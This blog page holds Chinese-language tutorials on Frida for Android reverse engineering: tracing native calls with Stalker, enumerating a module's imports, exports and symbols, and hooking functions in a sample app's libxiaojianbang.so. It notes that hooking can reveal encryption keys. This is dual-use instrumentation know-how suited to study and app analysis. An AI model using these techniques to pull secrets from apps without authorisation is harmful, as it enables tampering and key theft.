<h3 id="代码跟踪引擎stalker"><a href="#代码跟踪引擎stalker" class="headerlink" title="代码跟踪引擎stalker"></a>代码跟踪引擎stalker</h3><p>Stalker是Frida的代码跟踪引擎，允许跟踪线程，捕获每个调用，每个块，甚至每个执行的指令。它支持AArch64架构以及Intel64和IA-32</p>
<p>示例如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> md5Addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_ndk_NativeHelper_md5&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(md5Addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">tid</span> = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">        <span class="title class_">Stalker</span>.<span class="title function_">follow</span>(<span class="variable language_">this</span>.<span class="property">tid</span>, &#123;</span><br><span class="line">            <span class="attr">events</span>: &#123;</span><br><span class="line">                <span class="attr">call</span>: <span class="literal">true</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onReceive</span>(<span class="params">events</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> _events = <span class="title class_">Stalker</span>.<span class="title function_">parse</span>(events);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; _events.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(_events[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Stalker</span>.<span class="title function_">unfollow</span>(<span class="variable language_">this</span>.<span class="property">tid</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">call,0x7590e77054,0x7590d63f60,0</span></span><br><span class="line"><span class="comment">call,0x7590e035a8,0x7590e0b24c,0</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">这个脚本容易崩。。。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>Stalker.follow源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare namespace <span class="title class_">Stalker</span> &#123;</span><br><span class="line">		<span class="keyword">function</span> <span class="title function_">follow</span>(<span class="params">threadId?: ThreadId, options?: StalkerOptions</span>): <span class="keyword">void</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unfollow</span>(<span class="params">threadId?: ThreadId</span>): <span class="keyword">void</span>;</span><br><span class="line">		<span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">events: <span class="built_in">ArrayBuffer</span>, options?: StalkerParseOptions</span>): <span class="title class_">StalkerEventFull</span>[] | <span class="title class_">StalkerEventBare</span>[];</span><br><span class="line">		......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第0个参数是threaID，用于指定跟踪的线程(默认是当前线程)。用Process.getCurrentThreadId()来获取当前线程id，赋值给this.id，并传递给Stalker.unfollow，用于解除跟踪，函数第一个参数是options，类型为StalkerOptions，用于自定义跟踪选项。跟踪选项源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">StalkerOptions</span> &#123;</span><br><span class="line">    events?: &#123;</span><br><span class="line">        call?: boolean;</span><br><span class="line">        ret?: boolean;</span><br><span class="line">        exec?: boolean;</span><br><span class="line">        block?: boolean;</span><br><span class="line">        compile?: boolean;</span><br><span class="line">    &#125;;</span><br><span class="line">    onReceive?: <span class="function">(<span class="params">events: <span class="built_in">ArrayBuffer</span></span>) =&gt;</span> <span class="keyword">void</span>;</span><br><span class="line">    onCallSummary?: <span class="function">(<span class="params">summary: StalkerCallSummary</span>) =&gt;</span> <span class="keyword">void</span>;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>events用于指定生成哪些事件，传递给onReceive和onCallSummary。比如当events里面的call为true，Stalker在跟踪代码时，遇到函数调用，就会记录一些信息传递给onReceive和onCallSummary。events还支持在执行ret指令，所有指令exec，基本块block时生成事件。</p>
<p>events参数可以用Stalker.parse来解析。返回结果为StalkerEventFull数组或者StalkerEventBare数组。故使用循环即可遍历这些数组。并且Stalker.parse可以指定选项，StalkerParseOptions，源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">StalkerParseOptions</span> &#123;</span><br><span class="line">    annotate?: boolean;</span><br><span class="line">    stringify?: boolean;</span><br><span class="line">&#125;</span><br><span class="line">type <span class="title class_">StalkerEventFull</span> = <span class="title class_">StalkerCallEventFull</span> | <span class="title class_">StalkerRetEventFull</span> | <span class="title class_">StalkerExecEventFull</span> |</span><br><span class="line">    <span class="title class_">StalkerBlockEventFull</span> | <span class="title class_">StalkerCompileEventFull</span>;</span><br><span class="line">type <span class="title class_">StalkerEventBare</span> = <span class="title class_">StalkerCallEventBare</span> | <span class="title class_">StalkerRetEventBare</span> | <span class="title class_">StalkerExecEventBare</span> |</span><br><span class="line">    <span class="title class_">StalkerBlockEventBare</span> | <span class="title class_">StalkerCompileEventBare</span>;</span><br><span class="line"></span><br><span class="line">type <span class="title class_">StalkerCallEventFull</span> = [ <span class="string">&quot;call&quot;</span>, <span class="title class_">NativePointer</span> | string, <span class="title class_">NativePointer</span> | string, number ];</span><br><span class="line">type <span class="title class_">StalkerCallEventBare</span> = [         <span class="title class_">NativePointer</span> | string, <span class="title class_">NativePointer</span> | string, number ];</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>在示例代码的输出中 call,0x7590e77054,0x7590d63f60,0。对应上面来看。</p>
<p>从左到右分别表示事件类型为call，发生call时的地址，call所调用的函数地址。将示例代码稍作修改如下</p>
<p>onReceive事件通常用于查看函数流程，onCallSummary事件用于查看对应地址被调用次数。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onReceive</span>(<span class="params">events</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> _events = <span class="title class_">Stalker</span>.<span class="title function_">parse</span>(events);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; _events.<span class="property">length</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> addr1 = _events[i][<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">var</span> module1 = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(addr1);</span><br><span class="line">		<span class="keyword">if</span> (module1 &amp;&amp; module1.<span class="property">name</span> == <span class="string">&quot;libxiaojianbang.so&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">var</span> addr2 = _events[i][<span class="number">2</span>];</span><br><span class="line">			<span class="keyword">var</span> module2 = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(addr2);</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(module1.<span class="property">name</span>, addr1.<span class="title function_">sub</span>(module1.<span class="property">base</span>), module2.<span class="property">name</span>, addr2.<span class="title function_">sub</span>(module2.<span class="property">base</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x1f64 libxiaojianbang.so 0x1440</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x1710 libxiaojianbang.so 0x1630</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x187c libart.so 0x34f218  这个表示call的地址在libxiaojianbang.so的地址为0x187c处 ，被调用的函数定义在libart.so的0x34f128</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>注意Stalker.follow会跟踪所有so文件的调用，包括一些系统so文件，所以容易崩，做好过滤和注释掉一些不必要的。</p>
<p>再来介绍一下onCallSummary的使用，该回调函数接受一个类型为StalkerCallSummary的参数，源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">StalkerCallSummary</span> &#123;</span><br><span class="line">    [<span class="attr">target</span>: string]: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>summary是一个对象，属性名时被调用的函数地址，属性值是被调用的次数</p>
<p>看看它的写法</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> md5Addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_ndk_NativeHelper_md5&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(md5Addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">tid</span> = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">        <span class="title class_">Stalker</span>.<span class="title function_">follow</span>(<span class="variable language_">this</span>.<span class="property">tid</span>, &#123;</span><br><span class="line">            <span class="attr">events</span>: &#123;</span><br><span class="line">                <span class="attr">call</span>: <span class="literal">true</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onCallSummary</span>(<span class="params">summary</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">const</span> addr <span class="keyword">in</span> summary) &#123;</span><br><span class="line">                    <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(addr);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable language_">module</span> &amp;&amp; <span class="variable language_">module</span>.<span class="property">name</span> == <span class="string">&quot;libxiaojianbang.so&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">const</span> num = summary[addr];</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">module</span>.<span class="property">name</span>, <span class="title function_">ptr</span>(addr).<span class="title function_">sub</span>(<span class="variable language_">module</span>.<span class="property">base</span>), num);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Stalker</span>.<span class="title function_">unfollow</span>(<span class="variable language_">this</span>.<span class="property">tid</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x14a0 2</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x15e0 1</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x1610 1</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x1460 1</span></span><br><span class="line"><span class="comment">libxiaojianbang.so 0x15d0 16</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">哇超，真的容易崩</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>找到目标so的信息，并将那些地址全部Hook，打印参数和返回值，以此来缩小关键函数范围，甚至对于封装的比较好的加密算法，可以直接得到密钥等关键信息。</p>
<p>但是需要注意Stalker记录的call函数地址，包含plt表中的地址，这些地址无法被Hook，需要剔除。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/10/24/So%E5%B1%82Hook/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/24/So%E5%B1%82Hook/" class="post-title-link" itemprop="url">So层Hook</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-24 14:05:10" itemprop="dateCreated datePublished" datetime="2022-10-24T14:05:10+08:00">2022-10-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:26:14" itemprop="dateModified" datetime="2025-10-14T23:26:14+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="So层Hook"><a href="#So层Hook" class="headerlink" title="So层Hook"></a>So层Hook</h1><p><strong>示例应用的so文件加载时机是在一些按钮被点击后才加载，注意开启应用后注入，然后点击按钮，才会输出相关信息</strong></p>
<p>像那种一开始就有加载so的代码，先点击CADD（其他能加载so的按钮也行）一下，再注入，防止找不到so文件。</p>
<p>最基本的，加载so</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">module</span>!=<span class="variable constant_">NULL</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>));<span class="comment">//顺带输出一些基础信息，模块名，加载到内存后的首地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也可以用getModuleByName，不过该函数如果找不到对应的模块会抛出异常，前者找不到会返回NULL。据说frida里，find和get开头的一样的函数都是这样。</p>
<p><strong>Module对象的属性可以通过JSON.stringfy方法来打印</strong></p>
<p>通过地址获取模块;主要通过以下的api</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">findModuleByAddress</span>(<span class="attr">addres</span>:<span class="title class_">NativePointerValue</span>):<span class="title class_">Module</span> | <span class="variable constant_">NULL</span>;</span><br><span class="line"><span class="title function_">getModuleByAddress</span>(<span class="attr">addres</span>:<span class="title class_">NativePointerValue</span>):<span class="title class_">Module</span>;</span><br></pre></td></tr></table></figure>

<h3 id="枚举导入表"><a href="#枚举导入表" class="headerlink" title="枚举导入表"></a>枚举导入表</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> imports = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">enumerateImports</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringfy</span>(imports[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure>

<p>得到模块中指定函数的地址，进行一个遍历</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> improts = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">enumerateImports</span>();</span><br><span class="line"><span class="keyword">var</span> sprintf_addr = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; improts.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> _import = improts[i];</span><br><span class="line">    <span class="keyword">if</span>(_import.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;sprintf&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">        sprintf_addr = _import.<span class="property">address</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sprintf_addr: &quot;</span>, sprintf_addr);</span><br></pre></td></tr></table></figure>

<h3 id="枚举导出表"><a href="#枚举导出表" class="headerlink" title="枚举导出表"></a>枚举导出表</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">enumerateExports</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure>

<p>同样的，得到模块中指定函数的地址，进行一个遍历</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">enumerateExports</span>();</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MD5Final</span>_addr = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">exports</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> _export = <span class="built_in">exports</span>[i];</span><br><span class="line">    <span class="keyword">if</span>(_export.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;_Z8MD5FinalP7MD5_CTXPh&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title class_">MD5Final</span>_addr = _export.<span class="property">address</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MD5Final_addr: &quot;</span>, <span class="title class_">MD5Final</span>_addr);</span><br></pre></td></tr></table></figure>

<h3 id="枚举模块中的符号表"><a href="#枚举模块中的符号表" class="headerlink" title="枚举模块中的符号表"></a>枚举模块中的符号表</h3><p>将导入表导出表都给遍历了</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">findFuncInWitchSo</span>(<span class="params">funcName</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> modules = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; modules.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable language_">module</span> = modules[i];</span><br><span class="line">        <span class="keyword">let</span> _symbols = <span class="variable language_">module</span>.<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; _symbols.<span class="property">length</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">let</span> _symbol = _symbols[i];</span><br><span class="line">            <span class="keyword">if</span>(_symbol.<span class="property">name</span> == funcName)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">name</span> + <span class="string">&quot; &quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_symbol);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> _exports = <span class="variable language_">module</span>.<span class="title function_">enumerateExports</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; _exports.<span class="property">length</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">let</span> _export = _exports[j];</span><br><span class="line">            <span class="keyword">if</span>(_export.<span class="property">name</span> == funcName)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">name</span> + <span class="string">&quot; &quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_export);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">findFuncInWitchSo</span>(<span class="string">&#x27;strcat&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>Module的源码声明</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">class</span> <span class="title class_">Module</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: string;			<span class="comment">//模块名</span></span><br><span class="line">    <span class="attr">base</span>: <span class="title class_">NativePointer</span>;	<span class="comment">//模块基址</span></span><br><span class="line">    <span class="attr">size</span>: number;			<span class="comment">//模块大小</span></span><br><span class="line">    <span class="attr">path</span>: string;			<span class="comment">//模块所在路径</span></span><br><span class="line">    <span class="title function_">enumerateImports</span>(): <span class="title class_">ModuleImportDetails</span>[];	<span class="comment">//枚举导入表</span></span><br><span class="line">    <span class="title function_">enumerateExports</span>(): <span class="title class_">ModuleExportDetails</span>[];	<span class="comment">//枚举导出表</span></span><br><span class="line">    <span class="title function_">enumerateSymbols</span>(): <span class="title class_">ModuleSymbolDetails</span>[];	<span class="comment">//枚举符号表</span></span><br><span class="line">    <span class="title function_">findExportByName</span>(<span class="attr">exportName</span>: string): <span class="title class_">NativePointer</span> | <span class="literal">null</span>;	<span class="comment">//获取导出函数地址</span></span><br><span class="line">    <span class="title function_">getExportByName</span>(<span class="attr">exportName</span>: string): <span class="title class_">NativePointer</span>;		<span class="comment">//获取导出函数地址</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">load</span>(<span class="attr">name</span>: string): <span class="title class_">Module</span>;							<span class="comment">//加载指定模块</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">findBaseAddress</span>(<span class="attr">name</span>: string): <span class="title class_">NativePointer</span> | <span class="literal">null</span>;		<span class="comment">//获取模块基址</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">getBaseAddress</span>(<span class="attr">name</span>: string): <span class="title class_">NativePointer</span>;			<span class="comment">//获取模块基址</span></span><br><span class="line">    <span class="comment">//获取导出函数地址</span></span><br><span class="line"><span class="keyword">static</span> <span class="title function_">findExportByName</span>(<span class="attr">moduleName</span>: string | <span class="literal">null</span>, <span class="attr">exportName</span>: string): <span class="title class_">NativePointer</span> | <span class="literal">null</span>;	</span><br><span class="line"><span class="comment">//获取导出函数地址</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">getExportByName</span>(<span class="attr">moduleName</span>: string | <span class="literal">null</span>, <span class="attr">exportName</span>: string): <span class="title class_">NativePointer</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="正式开始Hook-so函数"><a href="#正式开始Hook-so函数" class="headerlink" title="正式开始Hook so函数"></a><em><strong>正式开始Hook so函数</strong></em></h2><h3 id="第一步，得到目标函数的地址"><a href="#第一步，得到目标函数的地址" class="headerlink" title="第一步，得到目标函数的地址"></a>第一步，得到目标函数的地址</h3><p>除了上述方法外，用Frida的API也可以</p>
<p>首先是静态方法和实例方法</p>
<p>静态方法可以直接通过 类名.方法名 的方式来访问，并传入两个参数，第一个是string类型的模块名，第二个是string类型的导出函数名(以汇编界面显示的名称位准，如上文的MD5_Final)</p>
<p>实例方法可以先获取Module对象，再通过 对象.方法名的方式来访问，只需要传入string类型的导出函数名即可，并返回NativePointer类型的函数地址。得到NativePointer类型的函数地址后，可以使用Interceptor的attach函数来进行Hook，也可以使用Interceptor的detachAll函数来解除Hook。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare namespace <span class="title class_">Interceptor</span>&#123;</span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">attach</span>(<span class="params">target:NativePointerValue,callbacksOrProbe:InvocationListenerCallbacks | InstructionProbeCallback,data?:NativePointerValue</span>):</span><br><span class="line">	<span class="title class_">InvocationListener</span>;</span><br><span class="line">		<span class="keyword">function</span> <span class="title function_">detatchAll</span>(<span class="params"></span>):<span class="keyword">void</span>;</span><br><span class="line">			....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，detachAll不需要任何参数，而attach则需要传入函数地址和被Hook函数触发时执行的回调函数。</p>
